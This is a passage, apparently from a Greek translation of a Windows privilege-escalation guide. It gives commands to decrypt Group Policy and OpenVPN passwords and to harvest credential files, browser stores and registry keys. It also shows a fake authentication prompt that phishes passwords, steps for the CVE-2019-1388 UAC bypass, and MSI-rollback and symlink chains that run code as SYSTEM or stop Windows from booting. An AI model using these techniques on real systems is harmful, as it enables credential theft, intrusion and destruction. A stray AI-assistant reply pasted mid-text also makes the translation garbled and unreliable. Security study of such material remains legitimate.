Αναζητήστε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ για αυτά τα αρχεία:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρησιμοποιώντας το crackmapexec για να αποκτήσετε τους κωδικούς:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN διαπιστευτήρια
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Καταγραφές
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισάγει τα διαπιστευτήριά του ή ακόμα και τα διαπιστευτήρια ενός άλλου χρήστη** αν νομίζετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το **να ζητάτε** απευθείας από τον χρήστη τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν credentials**

Γνωστά αρχεία που πριν κάποιο καιρό περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or upload the file), and I will translate the English text to Greek, preserving all markdown/html tags, links, paths, code, and the other items you specified.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Επίσης, ελέγξτε τον Bin για credentials μέσα σε αυτόν

Για να **recover passwords** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Άλλα πιθανά registry keys με credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή κλειδιών OpenSSH από το μητρώο.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό Περιηγητών

Πρέπει να ελέγξετε για dbs όπου αποθηκεύονται κωδικοί από **Chrome ή Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των browsers, αφού ίσως κάποιοι **κωδικοί** να είναι αποθηκευμένοι εκεί.

Εργαλεία για εξαγωγή κωδικών από browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε COM component **αναγνωρίζεται μέσω ενός class ID (CLSID)** και κάθε component εκθέτει λειτουργικότητα μέσω μίας ή περισσοτέρων διεπαφών, που αναγνωρίζονται μέσω interface IDs (IIDs).

Οι κλάσεις και διεπαφές COM ορίζονται στο μητρώο κάτω από **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το μητρώο δημιουργείται συγχωνεύοντας τα **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του μητρώου μπορείτε να βρείτε το child registry **InProcServer32** που περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, εάν μπορείτε να **overwrite any of the DLLs** που πρόκειται να εκτελεστούν, θα μπορούσατε να **αυξήσετε προνόμια** εάν αυτό το DLL εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, ελέγξτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών σε αρχεία και μητρώο**

**Αναζήτηση περιεχομένων αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση αρχείου με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζήτηση στο registry για ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin που δημιούργησα για να **εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** εντός του θύματος.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμα εξαιρετικό εργαλείο για εξαγωγή passwords από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** από διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα διαμοιραζόμενα τμήματα μνήμης, αναφερόμενα ως **pipes**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια λειτουργία που ονομάζεται **Named Pipes**, επιτρέποντας σε μη σχετιζόμενες διεργασίες να μοιράζονται δεδομένα, ακόμη και σε διαφορετικά δίκτυα. Αυτό μοιάζει με αρχιτεκτονική client/server, με τους ρόλους να ορίζονται ως **named pipe server** και **named pipe client**.

Όταν δεδομένα αποστέλλονται μέσω μιας pipe από έναν **client**, ο **server** που δημιούργησε την pipe έχει τη δυνατότητα να **υποδυθεί την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Η ταυτοποίηση μιας **προνομιούχας διεργασίας** που επικοινωνεί μέσω μιας pipe που μπορείτε να μιμηθείτε δίνει την ευκαιρία να **αποκτήσετε υψηλότερα προνόμια** υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδρά με την pipe που έχετε δημιουργήσει. Για οδηγίες εκτέλεσης μιας τέτοιας επίθεσης, χρήσιμοι οδηγοί υπάρχουν [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης το ακόλουθο εργαλείο επιτρέπει να **παρεμβληθεί η επικοινωνία ενός named pipe με εργαλείο όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την καταγραφή και προβολή όλων των pipes για να βρείτε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv) σε server mode εκθέτει `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος αυθεντικοποιημένος client μπορεί να καταχραστεί το μονοπάτι ασύγχρονων γεγονότων με βάση mailslot ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετο **4-byte write** σε οποιοδήποτε υπάρχον αρχείο εγγράψιμο από το `NETWORK SERVICE`, να αποκτήσει δικαιώματα Telephony admin και να φορτώσει μια αυθαίρετη DLL ως υπηρεσία. Ολόκληρη η ροή:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Όταν αποκτάτε ένα shell ως χρήστης, μπορεί να υπάρχουν προγραμματισμένες εργασίες ή άλλες διεργασίες που εκτελούνται και **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το script παρακάτω καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας οποιεσδήποτε διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών από διεργασίες

## Από χρήστη με χαμηλά δικαιώματα σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω console ή RDP) και το UAC είναι ενεργοποιημένο, σε κάποιες εκδόσεις του Microsoft Windows είναι δυνατό να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία όπως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατή την κλιμάκωση προνομίων και την παράκαμψη του UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν υπάρχει ανάγκη να εγκαταστήσετε οτιδήποτε και το binary που χρησιμοποιείται κατά τη διάρκεια της διαδικασίας είναι υπογεγραμμένο και εκδοθέν από τη Microsoft.

Κάποια από τα συστήματα που επηρεάζονται είναι τα εξής:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να exploit αυτή την vulnerability, είναι απαραίτητο να εκτελέσετε τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε για τα Επίπεδα Ακεραιότητας**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια **διαβάστε αυτό για να μάθετε για το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Διαγραφή/Μετακίνηση/Μετονομασία Αυθαίρετου Φακέλου σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτή την ανάρτηση στο blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με κώδικα exploit [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση βασικά αποτελεί κατάχρηση του rollback feature του Windows Installer για να αντικαταστήσει νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό ο επιτιθέμενος χρειάζεται να δημιουργήσει ένα **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για να καταλάβει τον φάκελο `C:\Config.Msi`, ο οποίος θα χρησιμοποιηθεί αργότερα από τον Windows Installer για να αποθηκεύσει τα αρχεία rollback κατά την απεγκατάσταση άλλων πακέτων MSI όπου τα αρχεία rollback θα είχαν τροποποιηθεί για να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### Από Διαγραφή/Μετακίνηση/Μετονομασία Αυθαίρετου Αρχείου σε SYSTEM EoP

Η κύρια τεχνική rollback του MSI (η προηγούμενη) προϋποθέτει ότι μπορείτε να διαγράψετε έναν **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Αλλά τι γίνεται αν η ευπάθεια σας επιτρέπει μόνο **αυθαίρετη διαγραφή αρχείου**;

Μπορείτε να εκμεταλλευτείτε τα **NTFS internals**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Έτσι, αν **διαγράψετε το `::$INDEX_ALLOCATION` stream** ενός φακέλου, NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε χρησιμοποιώντας τυπικά API διαγραφής αρχείων όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρόλο που καλείτε ένα *file* delete API, αυτό **διαγράφει τον ίδιο φάκελο**.

### Από Folder Contents Delete σε SYSTEM EoP
Τι γίνεται αν το primitive σας δεν σας επιτρέπει να διαγράψετε αυθαίρετα αρχεία/φακέλους, αλλά **επιτρέπει τη διαγραφή των *contents* ενός φακέλου που ελέγχεται από attacker**;

1. Βήμα 1: Ρύθμιση φακέλου-δολώματος και αρχείου
- Δημιουργία: `C:\temp\folder1`
- Μέσα σε αυτό: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθετήστε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια προνομιούχα διεργασία προσπαθήσει να διαγράψει `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Trigger διεργασία SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, το **oplock triggers** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακινήστε το `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να σπάσει το oplock.
- Μην διαγράψετε το `file1.txt` απευθείας — αυτό θα απελευθέρωνε το oplock πρόωρα.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει το εσωτερικό stream του NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή του διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει `file1.txt`.
- Αλλά τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από Arbitrary Folder Create σε Permanent DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμη και αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμες άδειες**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή συνήθως αντιστοιχεί στον kernel-mode driver `cng.sys`.
- Εάν **προδημιουργήσετε τον φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπει τον φάκελο, **αποτυγχάνει να εντοπίσει τον πραγματικό driver**, και **καταρρέει ή σταματά την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση**, και **καμία αποκατάσταση** χωρίς εξωτερική παρέμβαση (π.χ., επισκευή εκκίνησης ή πρόσβαση στο δίσκο).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Όταν μια **υπηρεσία με προνόμια** γράφει αρχεία καταγραφής/εξαγωγές σε μια διαδρομή που διαβάζεται από μια **εγγράψιμη διαμόρφωση**, ανακατευθύνετε αυτή τη διαδρομή με **Object Manager symlinks + NTFS mount points** για να μετατρέψετε την εγγραφή με προνόμια σε arbitrary overwrite (ακόμα και **χωρίς** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Το config που αποθηκεύει τη διαδρομή-στόχο να είναι εγγράψιμο από τον επιτιθέμενο (π.χ., `%ProgramData%\...\.ini`).
- Ικανότητα δημιουργίας mount point στο `\RPC Control` και ενός OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια ενέργεια με προνόμια που γράφει σε αυτή τη διαδρομή (log, export, report).

**Example chain**
1. Διαβάστε το config για να ανακτήσετε τον προορισμό του privileged log, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε να γράψει το προνομιούχο component το αρχείο καταγραφής (π.χ., ο admin ενεργοποιεί "send test SMS"). Η εγγραφή πλέον καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Επιθεωρήστε τον υπεγεγραμμένο στόχο (hex/PE parser) για να επιβεβαιώσετε την καταστροφή· μια επανεκκίνηση αναγκάζει τα Windows να φορτώσουν το παραποιημένο μονοπάτι του driver → **boot loop DoS**. Αυτό επίσης γενικεύεται σε οποιοδήποτε προστατευμένο αρχείο που μια υπηρεσία με προνόμια θα ανοίξει για εγγραφή.

> Το `cng.sys` φορτώνεται κανονικά από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει ένα αντίγραφο στο `C:\Windows\System32\cng.sys` μπορεί να επιχειρηθεί πρώτα, καθιστώντας το αξιόπιστο στόχο DoS για κατεστραμμένα δεδομένα.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Κατά τη δημιουργία ενός service binary βεβαιώσου ότι είναι ένα έγκυρο service ή ότι το binary εκτελεί τις απαραίτητες ενέργειες αρκετά γρήγορα καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια High Integrity process μπορείς να προσπαθήσεις να **enable the AlwaysInstallElevated registry entries** και να **install** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείς** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχεις αυτά τα token privileges (πιθανότατα θα τα βρεις σε μια ήδη High Integrity process), θα μπορέσεις να ανοίξεις σχεδόν οποιαδήποτε process (όχι protected processes) με το SeDebug privilege, να αντιγράψεις το token της process και να δημιουργήσεις μια αυθαίρετη process με εκείνο το token.\
